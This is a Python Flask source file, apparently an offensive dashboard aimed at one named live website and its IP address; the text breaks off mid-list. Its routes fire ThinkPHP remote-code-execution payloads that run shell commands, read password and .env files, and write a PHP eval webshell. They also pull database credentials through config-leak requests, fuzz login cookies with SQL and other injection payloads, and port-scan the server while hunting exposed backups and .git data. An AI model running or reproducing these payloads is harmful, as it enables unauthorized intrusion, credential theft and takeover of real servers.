from flask import Flask, request, jsonify, send_from_directory, Response
from flask_cors import CORS
import requests
import base64
import os
import socket
import re
import json
import time
import threading
import hashlib
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='.')
CORS(app, resources={r"/*": {"origins": "*"}})

TARGET = "https://goldmedal.cc"
TARGET_IP = "31.59.114.216"

# Cache for performance
cache = {}
CACHE_DURATION = 30  # seconds

# Thread pool for concurrent scans
executor = ThreadPoolExecutor(max_workers=20)

# Session pool for connection reuse
session_pool = {}

def get_session():
    """Get or create a session for connection reuse"""
    thread_id = threading.get_ident()
    if thread_id not in session_pool:
        session = requests.Session()
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        session_pool[thread_id] = session
    return session_pool[thread_id]

# ============================================================
# SERVE HTML - No Authentication Required
# ============================================================
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/<path:filename>')
def serve_static(filename):
    if os.path.exists(filename):
        return send_from_directory('.', filename)
    return jsonify({'error': 'File not found'}), 404

# ============================================================
# PROXY - Enhanced CORS Bypass with Cache
# ============================================================
@app.route('/proxy', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
def proxy():
    path = request.args.get('path', '/')
    url = f"{TARGET}/{path.lstrip('/')}"
    
    # Check cache for GET requests
    cache_key = f"proxy:{request.method}:{url}"
    if request.method == 'GET' and cache_key in cache:
        cached_time, cached_data = cache[cache_key]
        if time.time() - cached_time < CACHE_DURATION:
            return jsonify(cached_data)
    
    headers = {
        'User-Agent': request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    
    cookies = {}
    if 'custom_cookie' in request.args:
        encoded = base64.b64encode(request.args['custom_cookie'].encode()).decode()
        cookies['username'] = encoded
    
    try:
        session = get_session()
        
        if request.method == 'GET':
            resp = session.get(url, headers=headers, cookies=cookies, 
                             allow_redirects=False, timeout=15)
        elif request.method == 'POST':
            resp = session.post(url, headers=headers, cookies=cookies,
                              data=request.get_data(), allow_redirects=False, timeout=15)
        elif request.method == 'PUT':
            resp = session.put(url, headers=headers, cookies=cookies,
                             data=request.get_data(), allow_redirects=False, timeout=15)
        elif request.method == 'DELETE':
            resp = session.delete(url, headers=headers, cookies=cookies,
                                allow_redirects=False, timeout=15)
        else:
            resp = session.request(request.method, url, headers=headers,
                                 cookies=cookies, data=request.get_data(),
                                 allow_redirects=False, timeout=15)
        
        result = {
            'url': url,
            'status_code': resp.status_code,
            'headers': dict(resp.headers),
            'body': resp.text[:10000],
            'length': len(resp.text),
            'timestamp': datetime.now().isoformat()
        }
        
        # Cache GET requests
        if request.method == 'GET':
            cache[cache_key] = (time.time(), result)
        
        return jsonify(result)
    except requests.exceptions.Timeout:
        return jsonify({'error': 'Request timed out', 'url': url}), 504
    except requests.exceptions.ConnectionError:
        return jsonify({'error': 'Connection failed', 'url': url}), 502
    except Exception as e:
        return jsonify({'error': str(e), 'url': url}), 500

# ============================================================
# ADVANCED COOKIE TESTING - Multi-threaded
# ============================================================
@app.route('/test/cookie/<value>')
def test_cookie(value):
    encoded = base64.b64encode(value.encode()).decode()
    try:
        r = requests.get(f"{TARGET}/index.php", 
                        cookies={'username': encoded},
                        timeout=10, verify=False)
        
        # Enhanced analysis
        response_analysis = {
            'has_error': 'error' in r.text.lower() or 'exception' in r.text.lower(),
            'has_login': 'login' in r.text.lower(),
            'has_admin': 'admin' in r.text.lower(),
            'has_dashboard': 'dashboard' in r.text.lower(),
            'content_type': r.headers.get('Content-Type', ''),
            'redirect_url': r.headers.get('Location', ''),
        }
        
        return jsonify({
            'value_tested': value,
            'encoded_cookie': encoded,
            'status': r.status_code,
            'length': len(r.text),
            'different_from_default': len(r.text) > 500,
            'analysis': response_analysis,
            'snippet': r.text[:1000]
        })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/hunt/cookie-fuzz')
def cookie_fuzz():
    """Enhanced cookie fuzzing with concurrent requests"""
    values = [
        # Basic auth bypass
        'admin', 'root', 'administrator', '1', 'true', 'yes',
        # JSON injection
        '{"role":"admin"}', '{"id":1}', '{"user":"admin"}',
        '{"username":"admin"}', '{"is_admin":true}',
        # Existing user
        'Marufbelay', '', 'guest', 'test', 'user',
        # SQL injection
        'or 1=1', "' or '1'='1", '" or "1"="1',
        "admin' --", "admin' #", "1' or '1'='1",
        # NoSQL injection
        '{"$gt":""}', '{"$ne":null}', '[$ne]=',
        # Path traversal
        '../../etc/passwd', '..\\..\\windows\\win.ini',
        # Special values
        '0', '-1', 'null', 'undefined', 'NaN',
        'true', 'false', 'yes', 'no',
        # Encoded payloads
        base64.b64encode('admin'.encode()).decode(),
        base64.b64encode('root'.encode()).decode(),
        # XSS
        '<script>alert(1)</script>',
        # SSTI
        '{{7*7}}', '${7*7}',
    ]
    
    results = []
    
    def test_value(val):
        encoded = base64.b64encode(val.encode()).decode()
        try:
            r = requests.get(f"{TARGET}/index.php", 
                           cookies={'username': encoded},
                           timeout=10, verify=False)
            
            # Advanced response analysis
            is_error = 'HttpException' in r.text
            has_module_error = 'module not exists' in r.text.lower()
            has_redirect = r.status_code in [301, 302, 303, 307, 308]
            
            # Check for sensitive content
            sensitive_keywords = ['admin', 'dashboard', 'control', 'panel', 'manage',
                                 'users', 'settings', 'config', 'database']
            has_sensitive = any(kw in r.text.lower() for kw in sensitive_keywords)
            
            return {
                'value': val,
                'encoded': encoded,
                'status': r.status_code,
                'length': len(r.text),
                'is_error_page': is_error,
                'has_redirect': has_redirect,
                'redirect_to': r.headers.get('Location', ''),
                'has_sensitive': has_sensitive,
                'potential_impact': not is_error and not has_module_error and len(r.text) > 500,
                'snippet': r.text[:300]
            }
        except Exception as e:
            return {'value': val, 'error': str(e)}
    
    # Concurrent execution
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_value, val) for val in values]
        for future in as_completed(futures):
            results.append(future.result())
    
    return jsonify(results)

# ============================================================
# ENHANCED ThinkPHP CONFIG LEAK
# ============================================================
@app.route('/hunt/thinkphp-config')
def thinkphp_config():
    """Comprehensive ThinkPHP config extraction"""
    payloads = [
        # Database configs
        '/index.php?s=index/think\\config/get&name=database',
        '/index.php?s=index/think\\config/get&name=database.hostname',
        '/index.php?s=index/think\\config/get&name=database.username',
        '/index.php?s=index/think\\config/get&name=database.password',
        '/index.php?s=index/think\\config/get&name=database.database',
        '/index.php?s=index/think\\config/get&name=database.hostport',
        '/index.php?s=index/think\\config/get&name=database.dsn',
        '/index.php?s=index/think\\config/get&name=database.params',
        '/index.php?s=index/think\\config/get&name=database.prefix',
        '/index.php?s=index/think\\config/get&name=database.type',
        
        # App configs
        '/index.php?s=index/think\\config/get&name=app',
        '/index.php?s=index/think\\config/get&name=app.app_key',
        '/index.php?s=index/think\\config/get&name=app.app_secret',
        '/index.php?s=index/think\\config/get&name=app.app_debug',
        '/index.php?s=index/think\\config/get&name=app.app_trace',
        '/index.php?s=index/think\\config/get&name=app.default_return_type',
        
        # Cache configs
        '/index.php?s=index/think\\config/get&name=cache',
        '/index.php?s=index/think\\config/get&name=cache.type',
        '/index.php?s=index/think\\config/get&name=cache.host',
        '/index.php?s=index/think\\config/get&name=cache.port',
        '/index.php?s=index/think\\config/get&name=cache.password',
        
        # Session configs
        '/index.php?s=index/think\\config/get&name=session',
        '/index.php?s=index/think\\config/get&name=session.type',
        '/index.php?s=index/think\\config/get&name=session.expire',
        
        # Cookie configs
        '/index.php?s=index/think\\config/get&name=cookie',
        '/index.php?s=index/think\\config/get&name=cookie.expire',
        '/index.php?s=index/think\\config/get&name=cookie.domain',
        '/index.php?s=index/think\\config/get&name=cookie.secure',
        '/index.php?s=index/think\\config/get&name=cookie.httponly',
        
        # Template configs
        '/index.php?s=index/think\\config/get&name=template',
        '/index.php?s=index/think\\config/get&name=view_replace_str',
        
        # Log configs
        '/index.php?s=index/think\\config/get&name=log',
        '/index.php?s=index/think\\config/get&name=log.type',
        '/index.php?s=index/think\\config/get&name=log.path',
        '/index.php?s=index/think\\config/get&name=log.level',
        
        # Additional sensitive configs
        '/index.php?s=index/think\\config/get&name=extra',
        '/index.php?s=index/think\\config/get&name=mail',
        '/index.php?s=index/think\\config/get&name=sms',
        '/index.php?s=index/think\\config/get&name=wechat',
        '/index.php?s=index/think\\config/get&name=alipay',
        '/index.php?s=index/think\\config/get&name=pay',
        
        # Alternative payload formats
        '/index.php?s=index/\\think\\Config/load&file=database',
        '/index.php?s=index/\\think\\Config/load&file=app',
        '/index.php?s=index/\\think\\Config/load&file=cache',
    ]
    
    results = []
    
    def test_payload(p):
        try:
            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False,
                           headers={'User-Agent': 'Mozilla/5.0'})
            
            # Analyze response for sensitive data
            sensitive_patterns = {
                'password': r'(?:password|pwd|pass)\s*[=:]\s*["\']?([^"\'&\s]+)',
                'host': r'(?:hostname|host|server)\s*[=:]\s*["\']?([^"\'&\s]+)',
                'username': r'(?:username|user|db_user)\s*[=:]\s*["\']?([^"\'&\s]+)',
                'database': r'(?:database|db_name|db)\s*[=:]\s*["\']?([^"\'&\s]+)',
                'key': r'(?:key|secret|token|app_key)\s*[=:]\s*["\']?([^"\'&\s]+)',
                'port': r'(?:port|hostport)\s*[=:]\s*["\']?(\d+)',
            }
            
            found_sensitive = {}
            for name, pattern in sensitive_patterns.items():
                matches = re.findall(pattern, r.text, re.IGNORECASE)
                if matches:
                    found_sensitive[name] = matches
            
            return {
                'payload': p,
                'status': r.status_code,
                'length': len(r.text),
                'has_sensitive_data': len(found_sensitive) > 0,
                'sensitive_found': found_sensitive if found_sensitive else None,
                'snippet': r.text[:2000]
            }
        except Exception as e:
            return {'payload': p, 'error': str(e)}
    
    # Concurrent execution
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(test_payload, p) for p in payloads]
        for future in as_completed(futures):
            results.append(future.result())
    
    return jsonify(results)

# ============================================================
# ENHANCED RCE PAYLOADS
# ============================================================
@app.route('/hunt/rce-payloads')
def rce_payloads():
    """Comprehensive RCE payload testing"""
    payloads = [
        # PHP Info & System Info
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname -a',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd',
        
        # File & Directory Operations
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /www/wwwroot/',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/hosts',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env',
        
        # Network Info
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat -an',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ifconfig',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ps aux',
        
        # File reading via PHP functions
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/etc/passwd',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/wwwroot/invest307.fa/.env',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/wwwroot/invest307.fa/config/database.php',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_get_contents&vars[1][]=/www/server/panel/data/default.db',
        
        # Directory scanning
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/www/wwwroot/',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/tmp/',
        
        # Alternative payload patterns
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=eval&vars[1][]=phpinfo();',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=exec&vars[1][]=id',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=whoami',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][]=id',
        
        # Request method variation (POST)
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
        
        # Template injection attempts
        '/index.php?s=index/think\\view\\driver\\Php/display&content=<?php phpinfo();?>',
        '/index.php?s=index/think\\template\\driver\\file/write&cacheFile=shell.php&content=<?php @eval($_POST[cmd]);?>',
    ]
    
    results = []
    
    def test_payload(p):
        try:
            # Test GET
            r = requests.get(f"{TARGET}{p}", timeout=15, verify=False,
                           headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            
            # Enhanced detection
            is_potential_rce = False
            indicators = []
            
            # Check for common RCE success indicators
            if r.status_code == 200 and len(r.text) > 100:
                if 'module not exists' not in r.text.lower():
                    if 'uid=' in r.text or 'gid=' in r.text:
                        indicators.append('Unix user info detected')
                        is_potential_rce = True
                    if 'root:' in r.text or '/bin/bash' in r.text:
                        indicators.append('Passwd file content detected')
                        is_potential_rce = True
                    if 'phpinfo' in r.text.lower() or 'PHP Version' in r.text:
                        indicators.append('PHP info detected')
                        is_potential_rce = True
                    if 'total' in r.text.lower() and ('drwx' in r.text or '-rw' in r.text):
                        indicators.append('Directory listing detected')
                        is_potential_rce = True
                    if 'www' in r.text.lower() and len(r.text) > 200:
                        indicators.append('Potential file system access')
                        is_potential_rce = True
            
            return {
                'payload': p,
                'status': r.status_code,
                'length': len(r.text),
                'potential_rce': is_potential_rce,
                'indicators': indicators,
                'snippet': r.text[:2000]
            }
        except Exception as e:
            return {'payload': p, 'error': str(e)}
    
    # Concurrent execution
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(test_payload, p) for p in payloads]
        for future in as_completed(futures):
            results.append(future.result())
    
    return jsonify(results)

# ============================================================
# .GIT LEAK DETECTION - Enhanced
# ============================================================
@app.route('/hunt/git-leak')
def git_leak():
    """Comprehensive .git exposure check"""
    paths = [
        '/.git/HEAD', '/.git/config', '/.git/index',
        '/.git/refs/heads/master', '/.git/refs/heads/main',
        '/.git/refs/heads/develop', '/.git/refs/stash',
        '/.git/logs/HEAD', '/.git/logs/refs/heads/master',
        '/.git/logs/refs/heads/main',
        '/.git/COMMIT_EDITMSG', '/.git/description',
        '/.git/hooks/', '/.git/hooks/pre-commit',
        '/.git/hooks/post-commit', '/.git/info/exclude',
        '/.git/objects/info/packs', '/.git/packed-refs',
        '/.git/FETCH_HEAD', '/.git/ORIG_HEAD',
        '/.git/refs/remotes/origin/HEAD',
        '/.git/refs/tags/', '/.git/info/refs',
        '/.gitignore', '/.gitattributes',
    ]
    
    results = []
    
    def check_path(p):
        try:
            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False)
            
            # Analyze content for sensitive info
            has_refs = 'ref:' in r.text or 'refs/' in r.text
            has_commit = re.search(r'[a-f0-9]{40}', r.text)
            has_remote = 'url = ' in r.text.lower() or 'remote' in r.text.lower()
            
            return {
                'path': p,
                'status': r.status_code,
                'length': len(r.text),
                'has_refs': has_refs,
                'has_commit_hash': bool(has_commit),
                'has_remote_info': has_remote,
                'content': r.text[:500] if r.status_code == 200 else None
            }
        except Exception as e:
            return {'path': p, 'error': str(e)}
    
    # Concurrent execution
    with ThreadPoolExecutor(max_workers=15) as executor:
        futures = [executor.submit(check_path, p) for p in paths]
        for future in as_completed(futures):
            results.append(future.result())
    
    return jsonify(results)

# ============================================================
# BACKUP FILE FINDER - Enhanced
# ============================================================
@app.route('/hunt/backup-files')
def backup_files():
    """Enhanced backup file discovery"""
    backups = [
        # Common web backups
        'backup.zip', 'backup.tar.gz', 'backup.rar', 'backup.7z',
        'www.zip', 'www.tar.gz', 'web.zip', 'web.tar.gz',
        'site.zip', 'site.tar.gz', 'backup.tar', 'backup.bz2',
        
        # Project-specific
        'invest307.fa.zip', 'invest307.zip', 'invest.zip',
        'goldmedal.zip', 'goldmedal.tar.gz', 'goldmedal.rar',
        'invest307.fa.tar.gz', 'goldmedal_backup.zip',
        
        # SQL dumps
        'backup.sql', 'database.sql', 'dump.sql', 'db.sql',
        'export.sql', 'backup_db.sql', 'data.sql', 'mysql.sql',
        'backup-{}.sql'.format(datetime.now().strftime('%Y%m%d')),
        'backup-{}.sql'.format(datetime.now().strftime('%Y-%m-%d')),
        
        # Config files
        '.env', '.env.backup', '.env.production', '.env.local',
        '.env.development', '.env.example', '.env.old',
        '.env.prod', '.env.staging',
        'config.php.bak', 'config.php.old', 'config.php.save',
        'config.php~', 'config.php.swp',
        'database.php.bak', 'database.php.old',
        'database.yml', 'database.yaml',
        
        # Admin backups
        'admin.php.bak', 'index.php.bak', 'index.php.old',
        'admin.old', 'admin.bak',
        
        # Other sensitive files
        'phpinfo.php', 'info.php', 'test.php', 'install.php',
        'admin.php', 'config.php', 'db.php', 'setup.php',
        'README.md', 'readme.html', 'changelog.txt',
        'composer.json', 'composer.lock', 'package.json',
        'package-lock.json', 'yarn.lock',
        '.htaccess', '.nginx.conf', 'nginx.conf',
        'docker-compose.yml', 'Dockerfile',
        '.DS_Store', '.vscode/', '.idea/',
        'credentials.txt', 'passwords.txt', 'secrets.txt',
        'adminer.php', 'phpMyAdmin/', 'pma/',
        
        # Log files
        'error.log', 'access.log', 'debug.log', 'app.log',
        'runtime/log/', 'logs/error.log',
        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=scandir&vars[1][]=/www/wwwroot/invest307.fa/',
    ]
    
    results = []
    
    def check_file(b):
        try:
            r = requests.get(f"{TARGET}/{b}", timeout=10, verify=False,
                           headers={'User-Agent': 'Mozilla/5.0'})
            
            if r.status_code == 200 and len(r.text) > 0:
                # Check for sensitive content
                has_passwords = bool(re.search(r'(?:password|passwd|pwd|secret|token|key)\s*[:=]\s*["\']?([^"\'&\s]{3,})', 
                                             r.text, re.IGNORECASE))
                has_sql = bool(re.search(r'(?:CREATE TABLE|INSERT INTO|DROP TABLE|ALTER TABLE)', 
                                        r.text, re.IGNORECASE))
                has_config = bool(re.search(r'(?:define\(|config\[|env\(|\$\w+\s*=\s*)', 
                                          r.text))
                
                return {
                    'file': f'/{b}',
                    'status': r.status_code,
                    'size': len(r.text),
                    'size_kb': round(len(r.text) / 1024, 2),
                    'content_type': r.headers.get('Content-Type', 'unknown'),
                    'has_passwords': has_passwords,
                    'has_sql': has_sql,
                    'has_config': has_config,
                    'snippet': r.text[:500]
                }
        except:
            pass
        
        # Try direct IP
        try:
            r = requests.get(f"http://{TARGET_IP}/{b}", timeout=5, verify=False)
            if r.status_code == 200:
                return {
                    'file': f'[DIRECT IP] /{b}',
                    'status': r.status_code,
                    'size': len(r.text),
                    'size_kb': round(len(r.text) / 1024, 2),
                    'content_type': r.headers.get('Content-Type', 'unknown'),
                    'snippet': r.text[:500]
                }
        except:
            pass
        
        return None
    
    # Concurrent execution
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(check_file, b) for b in backups]
        for future in as_completed(futures):
            result = future.result()
            if result:
                results.append(result)
    
    return jsonify(results)

# ============================================================
# BT PANEL & SERVER TESTING - Enhanced
# ============================================================
@app.route('/hunt/bt-panel')
def bt_panel_check():
    """Enhanced BT Panel detection"""
    results = []
    
    # Common BT Panel paths
    bt_paths = ['/', '/login', '/site', '/soft', '/cron', '/firewall', '/files']
    
    # Check via direct IP on common BT ports
    bt_ports = [
        (8888, 'BT Panel (New)'),
        (888, 'BT Panel (Old)'),
        (7800, 'BT Panel Alt'),
        (80, 'HTTP'),
        (443, 'HTTPS'),
        (8080, 'HTTP Alt'),
        (8443, 'HTTPS Alt'),
    ]
    
    for port, service_name in bt_ports:
        for path in bt_paths:
            try:
                url = f"http://{TARGET_IP}:{port}{path}"
                r = requests.get(url, timeout=5, verify=False, 
                               allow_redirects=True,
                               headers={'User-Agent': 'Mozilla/5.0'})
                
                # Check for BT Panel indicators
                bt_indicators = {
                    'bt_keyword': 'bt' in r.text.lower() or 'baota' in r.text.lower(),
                    'aaPanel': 'aapanel' in r.text.lower(),
                    'login_form': 'login' in r.text.lower() and 'password' in r.text.lower(),
                    'ssl_warning': 'ssl' in r.text.lower() and 'certificate' in r.text.lower(),
                    'has_title': bool(re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)),
                }
                
                title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
                
                results.append({
                    'url': url,
                    'port': port,
                    'service': service_name,
                    'status': r.status_code,
                    'title': title_match.group(1) if title_match else None,
                    'length': len(r.text),
                    'indicators': bt_indicators,
                    'is_bt_panel': any(bt_indicators.values()),
                    'snippet': r.text[:500]
                })
            except requests.exceptions.Timeout:
                pass
            except requests.exceptions.ConnectionError:
                pass
            except Exception as e:
                pass
    
    return jsonify(results)

@app.route('/hunt/scan-common-ports')
def scan_common_ports():
    """Enhanced port scanning"""
    ports = [
        (21, 'FTP'),
        (22, 'SSH'),
        (25, 'SMTP'),
        (53, 'DNS'),
        (80, 'HTTP'),
        (110, 'POP3'),
        (143, 'IMAP'),
        (443, 'HTTPS'),
        (465, 'SMTPS'),
        (587, 'SMTP (Submission)'),
        (993, 'IMAPS'),
        (995, 'POP3S'),
        (3306, 'MySQL'),
        (3389, 'RDP'),
        (5432, 'PostgreSQL'),
        (6379, 'Redis'),
        (8080, 'HTTP-Alt'),
        (8443, 'HTTPS-Alt'),
        (8888, 'BT Panel'),
        (888, 'BT Panel Old'),
        (9090, 'Cockpit'),
        (27017, 'MongoDB'),
        (11211, 'Memcached'),
        (9200, 'Elasticsearch'),
        (5900, 'VNC'),
        (3000, 'Grafana/Node.js'),
        (4000, 'Node.js/React'),
        (5000, 'Flask/Python'),
        (7001, 'WebLogic'),
        (8089, 'Splunk'),
        (9000, 'PHP-FPM'),
        (10000, 'Webmin'),
    ]
    
    def check_port(port, service):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((TARGET_IP, port))
            sock.close()
            
            # Try HTTP connection on open ports
            http_result = None
            if result == 0:
                try:
                    r = requests.get(f"http://{TARGET_IP}:{port}", timeout=3, verify=False)
                    http_result = {
                        'status': r.status_code,
                        'title': re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
                    }
                    if http_result['title']:
                        http_result['title'] = http_result['title'].group(1)
                except:
                    pass
            
            return {
                'port': port,
                'service': service,
                'open': result == 0,
                'http_response': http_result
            }
        except:
            return {'port': port, 'service': service, 'open': False}
    
    # Concurrent port scanning
    results = []
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(check_port, port, service) for port, service in ports]
        for future in as_completed(futures):
            results.append(future.result())
    
    results.sort(key=lambda x: x['port'])
    return jsonify(results)

# ============================================================
# ADVANCED VUE.JS SOURCE ANALYSIS
# ============================================================
@app.route('/hunt/extract-js')
def extract_js():
    """Enhanced JavaScript analysis"""
    js_files = [
        '/static/js/app.aca0396932bf42fa0d8.js',
        '/static/js/manifest.e96b770b60e9f2607abc.js',
        '/static/js/9.a9b22fa2a69315eb5580.js',
        '/static/js/app.js',
        '/static/js/manifest.js',
        '/static/js/vendor.js',
        '/static/js/chunk-vendors.js',
        '/static/js/app.*.js',
    ]
    
    results = {}
    
    def analyze_js(js_file):
        try:
            r = requests.get(f"{TARGET}{js_file}", timeout=15, verify=False)
            if r.status_code == 200:
                code = r.text
                
                findings = {
                    'file': js_file,
                    'size': len(code),
                    'size_kb': round(len(code) / 1024, 2),
                    
                    # API Endpoints
                    'api_endpoints': list(set(re.findall(
                        r"""['"](/[a-zA-Z0-9/_-]*(?:api|login|register|admin|user|deposit|withdraw|balance|transaction|wallet|recharge|transfer|exchange|order|strategy|team|earn|profit|payment)[a-zA-Z0-9/_-]*)['"]""",
                        code, re.IGNORECASE
                    ))),
                    
                    # Admin Routes
                    'admin_routes': list(set(re.findall(
                        r"""['"](/[a-zA-Z0-9/_-]*admin[a-zA-Z0-9/_-]*)['"]""",
                        code, re.IGNORECASE
                    ))),
                    
                    # Tokens & Keys
                    'tokens_keys': list(set(re.findall(
                        r'(?:token|key|secret|password|auth|api_key|app_key|app_secret|access_token|refresh_token)\s*[:=]\s*["\'][^"\']{4,}["\']',
                        code, re.IGNORECASE
                    ))),
                    
                    # Vue Routes
                    'vue_routes': list(set(re.findall(
                        r'path\s*:\s*["\']([^"\']+)["\']',
                        code
                    ))),
                    
                    # HTTP Calls
                    'fetch_calls': list(set(re.findall(
                        r'fetch\s*\(\s*["\']([^"\']+)["\']',
                        code
                    ))),
                    
                    'axios_calls': list(set(re.findall(
                        r'(?:axios\.(?:get|post|put|delete|patch)\s*\(\s*["\']|baseURL\s*:\s*["\'])([^"\']+)["\']',
                        code
                    ))),
                    
                    # Hidden Functions
                    'auth_functions': list(set(re.findall(
                        r'(?:function|const|let|var)\s+(?:isAdmin|isAuth|checkAdmin|adminCheck|hasPermission|canEdit|canDelete|canWithdraw|isVIP|checkBalance|isLogin|getToken|setToken|clearToken)[^}]+',
                        code, re.IGNORECASE
                    ))),
                    
                    # Storage Keys
                    'localstorage_keys': list(set(re.findall(
                        r'localStorage\.(?:getItem|setItem)\s*\(\s*["\']([^"\']+)["\']',
                        code
                    ))),
                    
                    'sessionstorage_keys': list(set(re.findall(
                        r'sessionStorage\.(?:getItem|setItem)\s*\(\s*["\']([^"\']+)["\']',
                        code
                    ))),
                    
                    # Cookie references
                    'cookie_refs': list(set(re.findall(
                        r'document\.cookie[^;]+',
                        code
                    ))),
                    
                    # WebSocket endpoints
                    'websocket_endpoints': list(set(re.findall(
                        r'(?:ws|wss):\/\/[^\s"\']+',
                        code
                    ))),
                    
                    # Comments with potential info
                    'interesting_comments': list(set(re.findall(
                        r'\/\/.*(?:TODO|FIXME|HACK|DEBUG|TEMP|TEST|ADMIN|PASSWORD|SECRET|KEY)[^\n]*',
                        code, re.IGNORECASE
                    ))),
                }
                
                # Remove empty lists
                findings = {k: v for k, v in findings.items() if v or k in ['file', 'size', 'size_kb']}
                
                return js_file, findings
        except Exception as e:
            return js_file, {'error': str(e)}
    
    # Concurrent execution
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(analyze_js, js_file) for js_file in js_files]
        for future in as_completed(futures):
            js_file, findings = future.result()
            results[js_file] = findings
    
    return jsonify(results)

# ============================================================
# ENHANCED API DISCOVERY
# ============================================================
@app.route('/hunt/api-discovery')
def api_discovery():
    """Comprehensive API endpoint discovery"""
    base_url = f"{TARGET}/index.php"
    
    endpoints = [
        # Authentication
        'api/login', 'api/register', 'api/logout', 'api/refresh_token',
        'api/forgot_password', 'api/reset_password', 'api/verify_email',
        'api/send_code', 'api/verify_code',
        
        # User Management
        'api/user', 'api/user/info', 'api/user/profile', 'api/user/balance',
        'api/user/update', 'api/user/avatar', 'api/user/password',
        'api/user/settings', 'api/user/preferences', 'api/user/security',
        'api/user/kyc', 'api/user/verify', 'api/user/bind',
        
        # Wallet & Finance
        'api/wallet', 'api/wallet/list', 'api/wallet/add',
        'api/wallet/remove', 'api/wallet/default',
        'api/recharge', 'api/recharge/list', 'api/recharge/create',
        'api/recharge/callback', 'api/recharge/cancel',
        'api/withdraw', 'api/withdraw/list', 'api/withdraw/create',
        'api/withdraw/cancel', 'api/withdraw/fee',
        'api/transfer', 'api/transfer/create', 'api/transfer/history',
        'api/transfer/confirm',
        
        # Exchange & Trading
        'api/exchange', 'api/exchange/rate', 'api/exchange/convert',
        'api/exchange/history', 'api/exchange/fee',
        'api/trade', 'api/trade/buy', 'api/trade/sell',
        'api/trade/history', 'api/trade/cancel',
        
        # Orders & Transactions
        'api/transaction', 'api/transaction/list', 'api/transaction/detail',
        'api/transaction/export', 'api/transaction/stats',
        'api/order', 'api/order/list', 'api/order/create',
        'api/order/cancel', 'api/order/detail',
        
        # Strategy & Investment
        'api/strategy', 'api/strategy/list', 'api/strategy/detail',
        'api/strategy/subscribe', 'api/strategy/unsubscribe',
        'api/investment', 'api/investment/list', 'api/investment/create',
        
        # Team & Referral
        'api/team', 'api/team/report', 'api/team/members',
        'api/team/commission', 'api/team/level',
        'api/referral', 'api/referral/code', 'api/referral/stats',
        
        # Earnings & Profit
        'api/earnings', 'api/earnings/list', 'api/earnings/stats',
